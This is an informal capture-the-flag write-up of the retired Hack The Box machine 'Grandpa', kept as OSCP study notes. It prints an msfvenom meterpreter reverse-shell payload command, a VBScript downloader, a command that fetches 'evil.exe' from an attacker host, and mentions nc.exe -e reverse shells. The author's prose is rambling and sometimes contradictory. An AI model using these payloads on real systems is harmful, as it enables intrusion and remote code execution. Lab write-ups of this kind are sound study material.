
Name: Grandpa
Date:  5/11/2022
Difficulty:  Easy
Goals:  OSCP Prep
Learnt:
- Old HTB boxes are weird
- I am sick weird old boxes  
- Need I pause too frantic
- XP go for vb script
- VM for Python2 feels bad before hand and then it feels great

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](HackTheBox/Retired-Machines/Grandpa/Screenshots/ping.png)

[[CVE-2000-0114-http___10.129.95.233__vti_inf.html]] is 0 in severity, but 
[[CVE-2017-7269-http___10.129.95.233]] is critical RCE 9.5! for a buffer overflow, which there is a metasploit exploit for [https://www.exploit-db.com/exploits/41992](https://www.exploit-db.com/exploits/41992). There is also an 
[Explaination](https://www.exploit-db.com/exploits/8704) for a Remote Authenication Bypass allowing unrestricted listing downloading and uploading of files into password protected WebDAV folder. The 8806.pl did seem to work and neither did adding `%c0%af` into `curl`'s against `/images/` and  `/_Private/`. 

![](searchsploitoutput.png )

I tried for serval hours over multiple months for this box, but I do not have the time to let learning fall by the wayside. Returning to this knowing it require authenicated bypassing 

![](webdav.png)

## Exploit

Headturning I thought about making this a Helpthrough with IT security, but
[Explodingcan](https://github.com/danigargu/explodingcan) was an options I remember, as I though about following along I decide to be the most OSCP about this and do this entirely with the python2 exploit. I had already had that written above and found and was a option. Emotionally I was frantic and am still abit for various reasons of due to the [[Granny-Helped-Through]].

I wanted ot use do bothmeterpreter and the shell version and privilege escalation on windows XP does bananas time wise. But I have been burnt really hard for time and stressing about myself that its sort of me, but it is also these boxes. 
```
msfvenom -p windows/meterpreter/reverse_tcp -f raw -v sc -e x86/alpha_mixed LHOST=10.10.14.109 LPORT=80 > shellcode-met
```

```bash 
Traceback (most recent call last):
  File "41738.py", line 43, in <module>
    data = sock.recv(80960)
socket.error: [Errno 104] Connection reset by peer
```
Apparently
*Connection reset by peer" is the TCP/IP equivalent of slamming the phone back on the hook. It's more polite than merely not replying, leaving one hanging. But it's not the FIN-ACK expected of the truly polite TCP/IP converseur."*

The hellscape of python:
https://python.readthedocs.io/en/v2.7.2/library/httplib.html is renameed to http.client, 

I got a shell on the box, but I know would I run into the same issues, but I got metasploit issues. I know the metasploit exploit works, just not the privesc. I will finish this later a bit more calmly.

## Foothold && PrivEsc   

![](wmpubperm.png)
[0xdf](https://0xdf.gitlab.io/2020/05/28/htb-grandpa.html) also struggled and used [Churrasco](https://github.com/Re4son/Churrasco/)

## Windows-File-transferVBS-script
XP and 2003 lifesaver, from the OSCP course
BEWARE: "If creating on Linux and then transfer to windows then you may face issue sometime, use unix2dos before you transfer it in this case." 
Hakluke.
```vb
# wget.bs
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```
Run with:
```powershell
cscript wget.vbs http://attackerip/evil.exe evil.exe
```

![](churrasco.png)

I tried the same nc.exe -e, because I have also never actually done that from Windows

![](system.png)